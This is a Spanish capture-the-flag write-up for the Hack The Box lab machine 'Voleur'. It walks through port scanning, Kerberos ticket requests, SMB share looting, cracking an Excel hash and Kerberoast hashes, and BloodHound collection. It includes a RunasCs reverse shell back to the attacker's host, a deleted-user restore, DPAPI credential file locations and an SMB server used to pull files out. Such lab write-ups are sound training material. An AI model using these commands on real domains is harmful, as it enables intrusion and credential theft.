+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-05 22:41 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 22:41
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.76 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 56867/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 56866/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 49667/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 2222/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 59455/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 56869/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Discovered open port 56892/tcp on 10.10.11.76
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 22:41, 26.40s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.76
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.036s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-07-05 22:41:11 CEST <span class="k">for</span> 26s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65514</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">2222/tcp  open  EtherNetIP-1     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">56866/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">56867/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">56869/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">56892/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">59455/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.45 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">131061</span> <span class="o">(</span>5.767MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">33</span> <span class="o">(</span>1.452KB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">2222</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5985</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49664</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49667</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">56866</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">56867</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">56869</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">56892</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">59455</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,56866,56867,56869,56892,59455 10.10.11.76 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-05 22:45 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.76
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.067s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-06 04:45:31Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">56866/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">56867/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">56869/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">56892/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">59455/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OSs: Windows, Linux<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-07-06T04:46:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 7h59m49s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 100.99 seconds
+</span></span></code></pre></div><h1 id="autenticacion-ntlm-deshabilitada">Autenticacion NTLM deshabilitada<a hidden class="anchor" aria-hidden="true" href="#autenticacion-ntlm-deshabilitada">#</a></h1>
+<p>Al intentar comprobar las credenciales recibidas para iniciar la máquina, vemos que nos da como resultado <code>STATUS_NOT_SUPPORTED</code> además de que nos devuelve que <code>NTLM:False</code>.</p>
+<p>Esto quiere decir que o que el usuario tiene la autenticación NTLM deshabilitada o que directamente no se permite la autenticación NTLM en el dominio.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.76 -u <span class="s1">&#39;ryan.naylor&#39;</span> -p <span class="s1">&#39;HollowOct31Nyt&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.76     <span class="m">445</span>    10.10.11.76      <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.76<span class="o">)</span> <span class="o">(</span>domain:10.10.11.76<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.76     <span class="m">445</span>    10.10.11.76      <span class="o">[</span>-<span class="o">]</span> 10.10.11.76<span class="se">\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
+</span></span></code></pre></div><p>Entonces sincronizamos nuestra máquina con <code>ntpdate</code> al dominio y luego probamos a autenticarnos mediante kerberos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -u 10.10.11.76
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.76 -k -u <span class="s1">&#39;ryan.naylor&#39;</span> -p <span class="s1">&#39;HollowOct31Nyt&#39;</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 1" loading="lazy" src="/img/voleur/voleur_machine_1.png"></p>
+<h2 id="configuración-krb5conf">Configuración krb5.conf<a hidden class="anchor" aria-hidden="true" href="#configuración-krb5conf">#</a></h2>
+<p>Parece que vamos a tener que autenticarnos a través de <code>Tickets Garanting Tickets (TGT)</code> , con lo cual vamos a realizar la configuración del archivo <code>krb5.conf</code> para que cuando intentemos auntenticarnos mediante kerberos encuentre el <code>Key Distribution Center (KDC)</code>.</p>
+<pre tabindex="0"><code>sudo nano /etc/krb5.con
+
+[libdefaults]
+    default_realm = VOLEUR.HTB
+    ticket_lifetime = 24h
+    renew_lifetime = 7d
+    forwardable = true
+    rdns = false
+
+[realms]
+    VOLEUR.HTB = {
+        kdc = DC.voleur.htb
+        admin_server = DC.voleur.htb
+        default_domain = voleur.htb
+    }
+
+[domain_realm]
+    .voleur.htb = VOLEUR.HTB
+    voleur.htb = VOLEUR.HTB
+</code></pre><p>Una vez configurado el archivo krb5, con la herramienta <code>getTGT.py</code> voy a solicitar el Ticket Garanting Ticket (TGT) para el usuario ryan.naylor, que nos devolverá un ticket en formato .ccache para luego nosotros exportarlo a la variable <code>KRB5CCNAME</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py voleur.htb/ryan.naylor:<span class="s1">&#39;HollowOct31Nyt&#39;</span> -dc-ip 10.10.11.76
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Voleur/CONTENT/ryan.naylor.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">klist
+</span></span></code></pre></div><p><img alt="Voleur Machine 2" loading="lazy" src="/img/voleur/voleur_machine_2.png"></p>
+<h2 id="enumeración-smb--modulo-spider_plus---nxc">Enumeración SMB + modulo spider_plus - nxc<a hidden class="anchor" aria-hidden="true" href="#enumeración-smb--modulo-spider_plus---nxc">#</a></h2>
+<p>Ahora, vamos a ponerle a la variable <code>FQDN</code> el valor DC.voleur.htb, y luego realizaremos un escaneo a las carpetas comparitdas haciendo uso de nxc y la opción <code>--use-kcache</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">FQDN</span><span class="o">=</span>DC.voleur.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc smb <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache --shares
+</span></span></code></pre></div><p><img alt="Voleur Machine 3" loading="lazy" src="/img/voleur/voleur_machine_3.png"></p>
+<p>Vemos que tenemos varias carpetas no comunes como Finance, HR y IT, pero solo tenemos permiso de lectura con la carpeta IT, con lo cual vamos a enumerarla con el modulo <code>spider_plus</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache --shares -M spider_plus
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json <span class="p">|</span> jq
+</span></span></code></pre></div><p><img alt="Voleur Machine 4" loading="lazy" src="/img/voleur/voleur_machine_4.png"></p>
+<p>Vemos que dentro de la carpeta tenemos un archivo de excel llamado <code>Acces_Review</code>. Con lo cual nos lo descargamos con nxc usando <code>--get-file</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache --share <span class="s1">&#39;IT&#39;</span> --get-file <span class="s1">&#39;First-Line Support/Access_Review.xlsx&#39;</span> Access_Review.xlsx
+</span></span></code></pre></div><p><img alt="Voleur Machine 5" loading="lazy" src="/img/voleur/voleur_machine_5.png"></p>
+<p>Una vez tenemos el archivo nos lo abrimos, pero vemos que el archivo esta encriptado y necesitamos una contraseña para desbloaquearlo.</p>
+<p><img alt="Voleur Machine 6" loading="lazy" src="/img/voleur/voleur_machine_6.png"></p>
+<h3 id="extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon">Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon<a hidden class="anchor" aria-hidden="true" href="#extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon">#</a></h3>
+<p>Primero haciendo uso del script Office2Jhon extraemos el hash del archivo protegido.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/Herramientas/john/run/office2john.py Access_Review.xlsx &gt; hash-excel
+</span></span></code></pre></div><p>Ahora, vamos a craquear el hash obtenido usando el formato <code>office</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --format<span class="o">=</span>office hash-excel /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><p><img alt="Voleur Machine 7" loading="lazy" src="/img/voleur/voleur_machine_7.png"></p>
+<p>Una vez con la contraseña crackeada, desbloqueamos el archivo xlsx y vemos una tabla sobre los usuarios, permisos, estado de los usuarios y incluso algunas contraseñas.</p>
+<p><img alt="Voleur Machine 8" loading="lazy" src="/img/voleur/voleur_machine_8.png"></p>
+<h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Lanzamos el siguiente script de <code>bloodhound-python</code> para recabar toda la información posible del sistema, que luego usaremos en Bloodhound.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u <span class="s1">&#39;ryan.naylor&#39;</span> -k -no-pass -d VOLEUR.HTB -ns 10.10.11.76 -dc DC.voleur.htb -c all --zip --auth-method kerberos
+</span></span></code></pre></div><p><img alt="Voleur Machine 9" loading="lazy" src="/img/voleur/voleur_machine_9.png"></p>
+<p>Una vez metido los datos en Bloodhound, y habiendo revisado los usuarios visto en el excel. Vemos que el siguiente paso a dar será con <code>svc_ldap</code> del cual ademas tenemos una credencial en el apartado notas.</p>
+<p><img alt="Voleur Machine 10" loading="lazy" src="/img/voleur/voleur_machine_10.png"></p>
+<p>Comprobamos que las credenciales de svc_ldap sean validas. Y le sacamos un Ticket Garanting Ticket (TGT).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.10.11.76 -k -u <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;M1XyC9pW7qT5Vn&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getTGT.py voleur.htb/svc_ldap:<span class="s1">&#39;M1XyC9pW7qT5Vn&#39;</span> -dc-ip 10.10.11.76
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Voleur/CONTENT/svc_ldap.ccache
+</span></span></code></pre></div><p><img alt="Voleur Machine 11" loading="lazy" src="/img/voleur/voleur_machine_11.png"></p>
+<p><img alt="Voleur Machine 12" loading="lazy" src="/img/voleur/voleur_machine_12.png"></p>
+<p>Una vez con el TGT vamos a proceder a abusar de los permisos <code>GenericWrite</code> sobre el usuario lacey.miller y los permisos <code>WriteSPN</code> sobre svc_winrm lanzando un <code>kerberoast attack</code>.</p>
+<h2 id="kerberoast-attack---tergetedkerberoastpy">Kerberoast Attack - tergetedKerberoast.py<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack---tergetedkerberoastpy">#</a></h2>
+<p>Lanzamos el comando usando el script <code>targetedKerberoast.py</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.76 --dc-host DC.voleur.htb -d <span class="s1">&#39;VOLEUR.HTB&#39;</span> -u <span class="s1">&#39;svc_ldap&#39;</span> --no-pass -k
+</span></span></code></pre></div><p><img alt="Voleur Machine 13" loading="lazy" src="/img/voleur/voleur_machine_13.png"></p>
+<p>Y vemos que tenemos los hashes <code>Ticket Garanting Service (TGS)</code> de los usuarios lacey.miller y de svc_winrm. Ahora, usando hashcat vamos a tratar de crackearlos para obtener ambas contraseñas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat hash_tgs /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><p><img alt="Voleur Machine 14" loading="lazy" src="/img/voleur/voleur_machine_14.png"></p>
+<p>Vemos que la contraseña crackeada es <code>AFireInsidedeOzarctica980219afi</code>. Y iniciamos sesión a través de winrm. Con lo cual generamos el Ticket Garanting Ticket (TGT) y iniciamos sesión en la máquina.</p>
+<p><img alt="Voleur Machine 15" loading="lazy" src="/img/voleur/voleur_machine_15.png"></p>
+<p>En un principio intente hacer el ataque <code>ShadowCredentials</code> sobre el usuario lacey.miller, pero no estaba funcionando. Con lo cual seguramente el siguiente paso vaya por conseguir restaurar el usuario eliminado <code>Todd.Wolfie</code> que habíamos visto anteriormente en la nota.</p>
+<h2 id="shell-como-svc_ldap---runascsexe">Shell como svc_ldap - Runascs.exe<a hidden class="anchor" aria-hidden="true" href="#shell-como-svc_ldap---runascsexe">#</a></h2>
+<p>Nosotros en este caso tenemos una shell como el usuario <code>svc_winrm</code> , pero desde este usuario no tenemos los permisos Restore Objects que si tiene svc_ldap. Con lo cual haciendo uso de <code>runascs.exe</code>, vamos abrirnos una shell con runascs haciendo uso del usuario ldap.</p>
+<ul>
+<li><code>RunasCS</code> es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando.</li>
+</ul>
+<p>Para empezar, vamos a subir a la máquina mediante <code>upload</code> el archivo <code>RunasCs.exe</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_winrm</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">upload</span> <span class="p">./</span><span class="n">RunasCs</span><span class="p">/</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>Luego ejecutamos el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">svc_ldap</span> <span class="n">M1XyC9pW7qT5Vn</span> <span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-r</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="err">:</span><span class="mf">4444</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 16" loading="lazy" src="/img/voleur/voleur_machine_16.png"></p>
+<h2 id="restaurando-usuario-eliminado-con-restore-adobject">Restaurando usuario eliminado con Restore-ADObject<a hidden class="anchor" aria-hidden="true" href="#restaurando-usuario-eliminado-con-restore-adobject">#</a></h2>
+<p>Ahora con la shell recibida como el usuario svc_ldap, vamos a restaurar el usuario Todd.Wolfe. Primero comprobamos los objetos eliminados con <code>Get-ADObject</code>, entre ellos vemos al usuario que tenemos como objetivo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Get-ADObject -IncludeDeletedObjects -Filter <span class="o">{</span>Isdeleted -eq <span class="nv">$true</span><span class="o">}</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 17" loading="lazy" src="/img/voleur/voleur_machine_17.png"></p>
+<p>Ahora con el usuario identificado vamos a restaurarlo con <code>Restore-ADObject</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Restore-ADObject -Identity <span class="s2">&#34;1c6b1deb-c372-4cbb-87b1-15031de169db&#34;</span> -NewName <span class="s2">&#34;Todd.Wolfe&#34;</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 18" loading="lazy" src="/img/voleur/voleur_machine_18.png"></p>
+<h1 id="movimiento-lateral---dpapi-files">Movimiento Lateral - DPAPI Files<a hidden class="anchor" aria-hidden="true" href="#movimiento-lateral---dpapi-files">#</a></h1>
+<p>Luego de estar mirando los permisos de Todd.Wolfe, no encuentro nada interesante es entonces cuando decido lanzar el <code>winPEAS.exe</code>. Luego de estar un rato mirándolo, descubro que existen unas DPAPI Master Key Keys.</p>
+<p><img alt="Voleur Machine 19" loading="lazy" src="/img/voleur/voleur_machine_19.png"></p>
+<p>Aunque, aquí no nos valen estas credenciales ya que nos falta encontrar el archivo <code>credentials file</code> que es el que contiene las credenciales, con lo cual nos ponemos a enumerar los directorios del sistema. Estas son diferentes rutas donde pueden estar los archivos DPAPI almacenados, pero en este caso no los encontraremos aquí.</p>
+<p>Posibles rutas donde se almacenan:</p>
+<ul>
+<li><code>C:\Users\username\AppData\Roaming\Microsoft\Protect\*</code></li>
+<li><code>C:\Users\username\AppData\Roaming\Microsoft\Credentials*</code></li>
+<li><code>C:\Users\username\AppData\Roaming\Microsoft\Vault\*</code></li>
+<li>También podemos cambiar \Roaming\ por \Local\ en las rutas.</li>
+</ul>
+<p>En los directorios del sistema encontramos la carpeta IT en C: y ahí encontraremos el perfil archivado de Todd.Wolfie y los archivos DPAPI que buscábamos.</p>
+<ul>
+<li><code>C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110</code></li>
+<li><code>C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3</code></li>
+</ul>
+<p>Entonces he probado a descargarme el Masterkey y Credentials files pero me daba el siguiente error:</p>
+<p><img alt="Voleur Machine 20" loading="lazy" src="/img/voleur/voleur_machine_20.png"></p>
+<blockquote>
+<p>You can&rsquo;t access this shared folder because your organization&rsquo;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.</p>
+</blockquote>
+<p>Esto pasa ya que algunas políticas o por algunas versiones modernas de Windows no permiten la descarga de archivos de manera no autenticada, entonces he establecido un usuario y contraseña y me he conectado al servidor smb haciendo uso de ellas, ya luego he descargado los archivos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -username borhub -password borhub -smb2support
+</span></span></code></pre></div><p><img alt="Voleur Machine 21" loading="lazy" src="/img/voleur/voleur_machine_21.png"></p>
